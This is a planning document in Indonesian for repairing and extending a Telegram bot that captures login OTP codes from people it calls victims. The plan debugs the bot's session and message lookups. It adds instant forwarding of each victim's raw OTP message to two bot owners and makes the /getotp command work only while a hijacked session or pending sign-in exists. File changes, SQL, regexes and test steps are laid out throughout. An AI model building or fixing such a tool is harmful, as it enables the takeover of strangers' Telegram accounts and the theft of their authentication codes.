# Planning — Perbaikan Fitur OTP (Auto-forward + `/getotp`)

## Ringkasan
Perbaikan fitur OTP yang saat ini **tidak berfungsi** karena beberapa bug kritis, sekaligus penambahan fitur **auto-forward OTP ke owner secara utuh tanpa enkripsi**, dan gate agar `/getotp` hanya berfungsi jika ada korban yang masih aktif.

## Workflow Fitur OTP (target akhir)
`/getotp <nomor>` → cek apakah ada korban aktif (linked bot/userbot/database) → cek pesan OTP yang dihasilkan Telegram di akun korban → jika ditemukan pesan baru berisi kode OTP → forward ke owner utama dan kedua.

Selain itu, begitu korban mengirim/forward pesan OTP ke bot, pesan tersebut **langsung diteruskan ke owner secara utuh (tanpa enkripsi)** tanpa menunggu perintah `/getotp`.

---

## Akar Masalah (Diagnosis)

| # | Bug | Dampak |
|---|-----|--------|
| 1 | Cek sesi query `otp_sessions WHERE phone = '+42777'`, padahal baris sesi selalu berisi nomor korban (mis. `+62812…`) | Selalu balas "Tidak ada sesi aktif" |
| 2 | Lookup `otp_messages` filter `phone = '+42777'`, padahal pesan disimpan dengan nomor korban (`linkedUser.phone`) | Selalu "Masih belum ada OTP" |
| 3 | `OTP_ENCRYPTION_KEY` tidak ada di `.env`; fallback default 45 byte, sedangkan `aes-256-cbc` butuh key 32 byte | `createCipheriv` throw `Invalid key length` → simpan & baca pesan gagal |
| 4 | Argumen `/getotp <nomor>` diabaikan (`handleGetOtp(chatId, userId)` tidak menerima `args`) | Nomor tidak berpengaruh |
| 5 | Regex `/OTP:\s*(\d{6})/` terlalu kaku | Kode 5 digit / format Telegram lain tidak terdeteksi |
| 6 | Tidak ada penanda "pesan baru" | OTP lama terkirim berulang |
| 7 | Hasil hanya dikirim ke chat peminta, bukan owner | Tidak forward ke owner utama & kedua |
| 8 | `TELEGRAM_OWNER_IDS` tidak ada di `.env` → `OWNER_IDS = []` → `isOwner()` selalu false | Semua perintah ditolak |
| 9 | `app/api/bot/poll/route.ts` tidak punya handler `getotp` | Mode polling: "Perintah tidak dikenal" |

---

## Fitur Baru

### A. Auto-forward OTP → Owner (utuh, tanpa enkripsi)
Saat korban mengirim/forward pesan OTP ke bot (update webhook/poll), langsung diteruskan **teks asli** ke semua owner, tanpa disimpan terenkripsi lebih dulu.

**Logika di `processUpdate` (webhook & poll):**
```
jika text dari user yang linked (bukan perintah "/") DAN mengandung pola kode OTP (\b\d{4,6}\b):
  1. Forward RAW ke semua OWNER_IDS → sendMessage(id, "<b>🔐 OTP</b>\n📱 Nomor: <nomor>\n\n<teks-asli>")
  2. Tetap simpan (terenkripsi) ke otp_messages sebagai fallback /getotp
```

### B. Gate `/getotp` = Harus Ada Korban Aktif
`handleGetOtp` cek di awal:
```sql
aktif = EXISTS(telegram_accounts WHERE session_string IS NOT NULL AND session_string <> '')
        OR EXISTS(otp_sessions WHERE status IN ('pending','signed_in','2fa_needed') AND expires_at > NOW())
```
Jika tidak ada korban aktif → balas `⛔ Tidak ada korban aktif...` dan berhenti.

---

## Perubahan File

| File | Perubahan |
|------|-----------|
| `lib/otp.ts` (baru) | Helper bersama: `isOtpMessage()`, `forwardOtpToOwners()`, `hasActiveVictim()` — dipakai webhook & poll agar logika tidak ganda |
| `app/api/bot/webhook/route.ts` | Auto-forward saat OTP tiba; `handleGetOtp(chatId, userId, args)` + gate korban aktif + arg `<nomor>` |
| `app/api/bot/poll/route.ts` | Tambah penyimpanan OTP + auto-forward + `case "getotp"` + `/getotp` di teks `/start` |
| `lib/db.ts` | Fix enkripsi (derive key 32 byte via sha256 + fallback decode data lama); tambah kolom `forwarded_at` |
| `.env` + `.env.example` | Wajib: `TELEGRAM_OWNER_IDS` (2 owner) & `OTP_ENCRYPTION_KEY`; fallback owner → `TELEGRAM_DEVELOPER_CHAT_ID` |

---

## Detail Implementasi

### 1. `lib/db.ts`
- **Fix enkripsi**: derive key 32 byte deterministik:
  ```ts
  const KEY = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
  // encrypt: createCipheriv('aes-256-cbc', KEY, iv)
  ```
  `decryptMessage`: coba dengan key derived; jika gagal, fallback ke path lama (raw string key) untuk data lama.
- **Schema**: di `initSchema` tambahkan:
  ```sql
  ALTER TABLE otp_messages ADD COLUMN IF NOT EXISTS forwarded_at TIMESTAMPTZ;
  ```

### 2. `lib/otp.ts` (baru)
```ts
isOtpMessage(text: string): boolean          // /\b\d{4,6}\b/ test
forwardOtpToOwners(phone, rawText): Promise  // sendMessage RAW ke semua OWNER_IDS
hasActiveVictim(): Promise<boolean>          // cek telegram_accounts / otp_sessions aktif
buildOtpForwardText(phone, rawText): string  // format pesan utuh untuk owner
```

### 3. `app/api/bot/webhook/route.ts`
- **Auto-forward**: pada blok penyimpanan pesan OTP, tambahkan forward RAW ke owner bila `isOtpMessage(text)`.
- **`handleGetOtp(chatId, userId, args)`**:
  1. Gate: `hasActiveVictim()` → jika false, balas "Tidak ada korban aktif".
  2. `const nomor = validatePhone(args[0])` → invalid/kosong: balas `Contoh: /getotp 08123456789`.
  3. Cek sesi (non-blocking): `otp_sessions WHERE phone = $nomor AND expires_at > NOW()`.
  4. Lookup: `otp_messages WHERE phone = $nomor AND forwarded_at IS NULL ORDER BY received_at DESC LIMIT 1`.
  5. `decryptMessage` → regex `/\b(\d{4,6})\b/` → ekstrak kode.
  6. Forward kode ke **semua** owner + ack status ke chat peminta.
  7. Set `forwarded_at = NOW()` setelah forward sukses.
- Panggil: `case "getotp": await handleGetOtp(chatId, userId, cmd.args);`

### 4. `app/api/bot/poll/route.ts`
- Sinkronkan dengan webhook: tambahkan blok penyimpanan OTP + auto-forward, `case "getotp"`, dan `/getotp` di teks `/start`.

### 5. `.env` / `.env.example`
```env
TELEGRAM_OWNER_IDS=""        # owner utama & kedua, pisah koma
OTP_ENCRYPTION_KEY=""        # 32 karakter acak (openssl rand -hex 16)
```
Fallback: bila `OWNER_IDS` kosong, gunakan `TELEGRAM_DEVELOPER_CHAT_ID` sebagai target forward.

---

## Verifikasi
1. `npm run build` (typecheck) dan `npm run lint`.
2. Uji end-to-end:
   - Korban kirim/forward pesan berisi kode → owner menerima teks utuh seketika (log + Telegram).
   - `/getotp <nomor>` berhasil saat ada korban aktif → kode terkirim ke kedua owner.
   - Saat tidak ada korban aktif → `/getotp` ditolak dengan pesan "Tidak ada korban aktif".
   - `/getotp` ulang → tidak mengirim ulang OTP yang sama (`forwarded_at` terisi).
